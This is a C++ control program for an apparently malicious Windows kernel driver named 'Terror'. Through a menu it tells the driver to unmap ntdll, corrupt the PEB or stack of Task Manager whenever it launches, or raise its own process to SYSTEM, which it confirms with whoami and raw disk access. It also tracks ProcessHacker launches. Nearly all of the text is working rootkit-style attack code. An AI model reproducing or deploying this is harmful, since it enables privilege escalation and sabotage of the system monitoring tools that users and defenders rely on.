#include "defs.h"


//forward decs
bool CreateHandle();
DWORD GetProcess();
BOOL Is64BitWindows();



int main()
{


	if (!Is64BitWindows())
	{
		printf("[-] Unsupported cpu architecture\n");
		system("PAUSE");
		return 0;
	}
	else
	{
		HKEY hKey;
		DWORD major = 0, minor = 0, build = 0;
		WCHAR displayVersion[64] = { 0 };
		DWORD size = sizeof(DWORD);

		if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS)
		{
			RegQueryValueExW(hKey, L"CurrentMajorVersionNumber", NULL, NULL, (LPBYTE)&major, &size);
			RegQueryValueExW(hKey, L"CurrentMinorVersionNumber", NULL, NULL, (LPBYTE)&minor, &size);

			WCHAR buildStr[20];
			DWORD buildSize = sizeof(buildStr);
			if (RegQueryValueExW(hKey, L"CurrentBuildNumber", NULL, NULL, (LPBYTE)buildStr, &buildSize) == ERROR_SUCCESS)
			{
				build = _wtoi(buildStr);
			}


			size = sizeof(displayVersion);
			RegQueryValueExW(hKey, L"DisplayVersion", NULL, NULL, (LPBYTE)displayVersion, &size);
			RegCloseKey(hKey);
		}

		printf("========================================================\n");
		printf("CPU architecture: x64  \nOS version: %ls \nBuild: %d\n", displayVersion, build);
		printf("========================================================\n\n");

			RegCloseKey(hKey);

		
	}

	if (!CreateHandle())
	{
		printf("failed to create handle:  %i\r\n", GetLastError());
	}


	while (true)
	{
		int code;
		std::cin >> code;

		if (code == 1)
		{
			ctlcode = IO_UNMAP_NTDLL;
			printf("[+] Unmap ntdll\n");
			printf("Waiting for target proc...\n");
			break;
		}
		else if (code == 2)
		{
			ctlcode = IO_CORRUPT_PEB;
			printf("[+] PEB corruption\n");
			printf("Waiting for target proc...\n");
			break;
		}
		else if (code == 3)
		{
			ctlcode = IO_CORRUPT_STACK;
			printf("[+] Stack corruption\n");
			printf("[+] Waiting for target proc...\n");
			break;

		}
		else if (code == 4)
		{
			ctlcode = IO_ELEVATE_PROCESS;
			printf("[+] Elevate process\n\n");

			DWORD pid = GetCurrentProcessId();

			printf("whoami result #1: ");
			system("whoami");

			HANDLE handle = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);


			if (handle == INVALID_HANDLE_VALUE)
			{
				printf("Failed to create handle\n\n");
			}

			if (!DeviceIoControl(hDevice, ctlcode, &pid, sizeof(pid), NULL, 0, NULL, NULL))
			{
				printf("DeviceIoControl failed for PID %lu with error %lu\n", pid, GetLastError());
				Sleep(10000);
				ExitProcess(0);
			}

			Sleep(5000);
			
			printf("whoami result #2: ");
			system("whoami");

			handle = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

			if (handle)
			{
				printf("Created handle\n\n");
			}

			CloseHandle(handle);

			while (true)
			{
				Sleep(1);
			}
		}
		else
		{
			printf("[-] Wrong input\n");
		}
	}

	while (true)
	{
		GetProcess();

		Sleep(100);
	}


	CloseHandle(hDevice);

	system("PAUSE");

	return 1;

}

//get handle to the driver
bool CreateHandle()
{
	hDevice = CreateFileW(L"\\\\.\\Terror", GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);

	if (hDevice == INVALID_HANDLE_VALUE)
	{
		std::cout << "[-] Handle creation failed\n";
		std::cin.get();
		return false;
	}

	std::cout << "[+] Handle creation successful\n";

	return true;
}


//CPU arch check
BOOL Is64BitWindows() 
{

	SYSTEM_INFO sysInfo = { 0 };


	GetNativeSystemInfo(&sysInfo);


	if (sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
	{
		return TRUE;
	}
	
	return FALSE;

}



//loop through the process list and if a target process is found, send the PID to the driver via the correct control code
DWORD GetProcess()
{
	HANDLE snapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (snapshotHandle == INVALID_HANDLE_VALUE)
	{
		return NULL;
	}

	PROCESSENTRY32W processEntry = { };
	processEntry.dwSize = sizeof(PROCESSENTRY32W);

	if (Process32FirstW(snapshotHandle, &processEntry))
	{

		do
		{
			if (_wcsicmp(processEntry.szExeFile, taskManagerName) == 0)
			{

				if (_wcsicmp(processEntry.szExeFile, taskManagerName) == 0)
				{
					DWORD pid = processEntry.th32ProcessID;

					if (taskmanagerPIDlist.find(pid) == taskmanagerPIDlist.end())
					{
						printf("[+] Task manager launched: %lu\n", pid);
						taskmanagerPIDlist.insert(pid);
						taskManagerPID = pid;

						if (!DeviceIoControl(hDevice, ctlcode, &pid, sizeof(pid), NULL, 0, NULL, NULL))
						{
							printf("DeviceIoControl failed for PID %lu with error %lu\n", pid, GetLastError());
							Sleep(10000);
							ExitProcess(0);
						}

					}
				}

			}
			if (_wcsicmp(processEntry.szExeFile, processHackerName) == 0)
			{

				if (processHackerPID != processEntry.th32ProcessID)
				{
					printf("[+] ProcessHacker launched: %i\n", processEntry.th32ProcessID);
					processHackerPID = processEntry.th32ProcessID;
				}
			}

		} while (Process32NextW(snapshotHandle, &processEntry));
	}

	CloseHandle(snapshotHandle);
	return NULL;
}